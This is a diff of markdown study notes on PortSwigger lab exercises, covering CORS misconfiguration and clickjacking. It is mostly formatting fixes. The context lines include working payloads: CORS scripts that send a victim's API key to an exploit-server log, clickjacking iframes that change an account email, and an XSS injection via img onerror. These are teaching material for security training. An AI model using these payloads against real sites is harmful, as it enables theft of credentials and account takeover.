@@ -2025,12 +2025,12 @@ Content-Type: application/json
 **Mitigation**
 - Limit Access-Control-Allow-Origin to specific, trusted origins.
 - Avoid using wildcard origins or credentials with wildcard origins.
-- 
+  
 ### CORS Lab
 - Exploit the CORS misconfiguration to retrieve the administrator's API key
   - check if **CORS support** > `Access-Control-Allow-Credential' in response
   - Resubmit /accountDetails with header `Origin: https://example.com`   > observe that origin reflected in `Access-Control-Allow-Origin`
-  '''
+  ```
   Request
   Origin: https://example.com
   Response
@@ -2043,7 +2043,7 @@ Content-Type: application/json
           "t6wRKbrHu9OxFSbKnOVeaCBNxWbbTJbm"
         ]
    }
-  '''
+  ```
   - Craft payload
   ```
   <script>
@@ -2060,7 +2060,7 @@ Content-Type: application/json
   ```
   - Access log, retrieve the victim's API key
 - CORS vulnerability with trusted **null origin**
-  - Resubmit /accountDetails with header Origin: null >  observe that origin reflected in `Access-Control-Allow-Origin`
+  - Resubmit /accountDetails with header Origin: null >  observe that origin reflected in `Access-Control-Allow-Origin`	
   - Craft payload with sandbox iframe
     ```
     <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
@@ -2072,7 +2072,7 @@ Content-Type: application/json
     function reqListener() {
         location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
     };
-   </script>"></iframe>
+    </script>"></iframe>
     ```
 - CORS vulnerability with trusted **insecure protocols**
   - a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information   
@@ -2088,7 +2088,7 @@ Content-Type: application/json
 
     function reqListener()
        {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
-   </script>
+    </script>
     ```
 
 ## Clickjacking
@@ -2097,7 +2097,7 @@ Content-Type: application/json
 - **Frame busting scripts** are client-side protections designed to prevent clickjacking attacks by ensuring that a webpage is not embedded within a frame. They do this by checking if the current window is the top window, making frames visible, and preventing interactions with invisible frames. However, these scripts can be circumvented by attackers using techniques like the HTML5 iframe sandbox attribute, and they may not function if JavaScript is disabled or unsupported in the browser.
 
 **Construct a basic clickjacking attack**
-'''
+```
 <head>
 	<style>
 		#target_website {
@@ -2123,11 +2123,11 @@ Content-Type: application/json
 	<iframe id="target_website" src="https://vulnerable-website.com">
 	</iframe>
 </body>
-'''
+```
 
 ### Clickjacking Lab
-- **Basic clickjacking** with CSRF token protection
-  '''
+- **Basic clickjacking** with CSRF token protection	
+  ```
   <style>
     iframe {
         position:relative;
@@ -2145,17 +2145,17 @@ Content-Type: application/json
    </style>
    <div>Click me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
-  '''
-  - Replace **YOUR-LAB-ID** in the iframe src attribute with your unique lab ID   
+  ```
+  - Replace **YOUR-LAB-ID** in the iframe src attribute with your unique lab ID		  
   - Substitute suitable pixel values for the **$height_value** and **$width_value** variables of the iframe (we suggest 700px and 500px respectively).   
   - Substitute suitable pixel values for the **$top_value** and **$side_value** variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).   
-  - Set the **opacity** value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1.   
-- Clickjacking with form input data prefilled from a **URL parameter**	
-  <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account`?email=hacker@attacker-website.com`"></iframe>
-- Clickjacking with a **frame buster** script
-  <iframe `sandbox="allow-forms"` src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
-- Exploiting clickjacking vulnerability to trigger **DOM-based XSS**
-  <iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?`name=<img src=1 onerror=print()>'&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+  - Set the **opacity** value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1.	  
+- Clickjacking with form input data prefilled from a **URL parameter**	 	
+  <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>			
+- Clickjacking with a **frame buster** script		
+  <iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>			
+- Exploiting clickjacking vulnerability to trigger **DOM-based XSS**			
+  <iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>		
 - ddd
 
 ## XSS (Cross-Site Scripting)
